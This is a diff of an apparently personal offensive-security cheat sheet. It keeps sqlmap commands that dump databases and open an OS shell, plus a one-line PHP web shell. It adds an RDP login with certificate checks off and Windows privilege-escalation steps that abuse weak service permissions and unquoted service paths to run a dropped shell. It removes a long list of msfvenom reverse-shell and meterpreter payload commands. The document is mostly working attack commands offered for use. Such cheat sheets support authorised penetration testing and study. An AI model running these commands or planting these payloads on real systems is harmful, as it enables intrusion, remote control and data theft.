@@ -22,7 +22,6 @@ sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --current-user --current-db
 sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE --tables
 sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE -T TABLE --dump
 sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --os-shell
-
 https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 <pre><?php system($_REQUEST["yz"])?></pre><hr><form method="POST"><input type="text" id="yz" name="yz"><input type="submit" value="Submit"></form>
@@ -84,6 +83,8 @@ sudo tcpdump -i INTERFACE tcp src port PORT
 
 ################################################################ POST WINDOWS
 
+xfreerdp /u:USER /p:PASS /cert:ignore /v:RHOST
+
 git clone https://github.com/melnicek/peh
 
 powershell -ep bypass
@@ -107,6 +108,18 @@ john crack.me --wordlist=~/wordlists/rockyou.txt --format=NT
 
 use exploit/windows/local/persistence
 set session 1
+
+# INSECURE SERVICE PERMISSIONS
+C:\PrivEsc\accesschk.exe /accepteula -uwcqv USER SERVICE
+sc qc SERVICE
+sc config SERVICE binpath="PATH"
+net start daclsvc
+
+# UNQUOTED SERVICE PATH
+sc qc SERVICE
+accesschk.exe /accepteula -uwdq "PATH" 
+copy SHELL "PATH"
+net start SERVICE
 
 ################################################################ RECON
 
@@ -141,31 +154,8 @@ recon-ng
 
 ################################################################ MSFVENOM
 
-msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
-msfvenom -p windows/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
 msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
-msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
-msfvenom -p linux/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
-msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw > shell.php
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > shell.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > shell.war
-msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
-msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
-msfvenom -p php/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > shell.php
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > example.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > example.war
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
 
 ################################################################ WIRELESS
 
